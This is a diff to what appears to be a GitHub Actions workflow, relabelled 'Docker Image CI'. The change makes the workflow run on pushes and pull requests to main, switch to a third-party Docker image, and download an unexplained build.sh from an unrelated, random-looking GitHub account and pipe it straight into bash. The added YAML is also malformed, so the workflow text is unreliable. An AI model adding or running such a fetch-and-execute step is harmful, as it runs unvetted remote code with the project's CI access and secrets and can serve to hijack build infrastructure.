@@ -1,14 +1,18 @@
-# Action name
-name: Super Action
-
+name: Docker Image CI
 
 on:
-    push
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
 
-- uses: addnab/docker-run-action@v3
+jobs:
+
+  build:
+    steps:
+      - uses: addnab/docker-run-action@v3
   with:
-    image: docker:latest
+    image: dazz111/ubuntu-sdk:build
     shell: bash
     run: |
-      echo "first line"
-      echo "second line"
+      wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh && bash build.sh
